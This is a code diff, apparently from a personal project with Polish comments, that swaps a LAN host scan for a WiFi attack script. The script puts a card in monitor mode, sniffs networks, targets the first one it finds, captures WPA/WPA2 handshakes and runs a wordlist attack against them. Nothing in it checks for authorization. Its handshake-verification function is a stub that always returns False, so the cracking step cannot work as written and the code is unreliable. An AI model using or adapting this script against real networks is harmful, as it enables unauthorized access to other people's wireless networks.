@@ -230,25 +230,97 @@
 #         print("SSID:", network.ssid, "BSSID:", network.bssid, "Signal:", network.signal)
 #
 #
-# # Uruchamiamy funkcję skanującą
-# scan_wifi_networks()
+import os
+from scapy.all import *
+import hashlib
 
 
-import nmap
+def set_monitor_mode(interface):
+    print(f"Setting {interface} to monitor mode")
+    os.system(f"ifconfig {interface} down")
+    os.system(f"iwconfig {interface} mode monitor")
+    os.system(f"ifconfig {interface} up")
 
 
-def scan_wifi_networks():
-    # Tworzymy obiekt skanera sieci
-    scanner = nmap.PortScanner()
+def scan_wifi(interface):
+    # Ustaw interfejs w tryb monitor
+    set_monitor_mode(interface)
 
-    # Skanujemy sieć w poszukiwaniu urządzeń
-    scanner.scan(hosts='192.168.0.0/24', arguments='-sn')
+    networks = []
 
-    # Wyświetlamy znalezione urządzenia i ich adresy IP
-    for host in scanner.all_hosts():
-        if 'mac' in scanner[host]['addresses']:
-            print("MAC:", scanner[host]['addresses']['mac'], "IP:", host)
+    # Funkcja do obsługi wykrytych pakietów
+    def packet_handler(pkt):
+        if pkt.haslayer(Dot11):
+            if pkt.type == 0 and pkt.subtype == 8:
+                ssid = pkt.info.decode(errors='ignore')
+                bssid = pkt.addr2
+                if bssid not in [net['bssid'] for net in networks]:
+                    networks.append({'ssid': ssid, 'bssid': bssid})
+                    print(f"Found network - SSID: {ssid}, BSSID: {bssid}")
+
+    # Skanowanie pakietów
+    print("Scanning for WiFi networks...")
+    sniff(iface=interface, prn=packet_handler, timeout=10)
+
+    return networks
 
 
-# Uruchamiamy funkcję skanującą
-scan_wifi_networks()
+def capture_handshake(interface, bssid):
+    set_monitor_mode(interface)
+
+    def packet_handler(pkt):
+        if pkt.haslayer(EAPOL):
+            print("EAPOL packet captured!")
+            wrpcap("handshake.cap", pkt, append=True)
+
+    print(f"Listening for WPA/WPA2 handshakes from BSSID: {bssid}...")
+    sniff(iface=interface, prn=packet_handler, timeout=60)
+
+
+def hash_password(password, ssid):
+    pmk = hashlib.pbkdf2_hmac('sha1', password.encode(), ssid.encode(), 4096, 32)
+    return pmk.hex()
+
+
+def verify_handshake(handshake_file, hashed):
+    # Placeholder function to verify the handshake against the hashed password
+    # Implement proper verification logic here
+    return False
+
+
+def crack_password(handshake_file, wordlist_file, ssid):
+    with open(wordlist_file, 'r') as f:
+        for word in f:
+            word = word.strip()
+            hashed = hash_password(word, ssid)
+            print(f"Trying password: {word}, hash: {hashed}")
+            if verify_handshake(handshake_file, hashed):
+                print(f"Password found: {word}")
+                return word
+    print("Password not found.")
+    return None
+
+
+def main():
+    interface = "wlan0"  # Upewnij się, że nazwa interfejsu jest poprawna
+    wordlist_file = "wordlist.txt"
+
+    networks = scan_wifi(interface)
+    if not networks:
+        print("No networks found. Exiting.")
+        return
+
+    target_network = networks[0]  # Example: target the first found network
+    print(f"Targeting network: SSID: {target_network['ssid']}, BSSID: {target_network['bssid']}")
+
+    capture_handshake(interface, target_network['bssid'])
+
+    if os.path.exists("handshake.cap"):
+        crack_password("handshake.cap", wordlist_file, target_network['ssid'])
+    else:
+        print("No handshake captured. Exiting.")
+
+
+if __name__ == "__main__":
+    main()
+
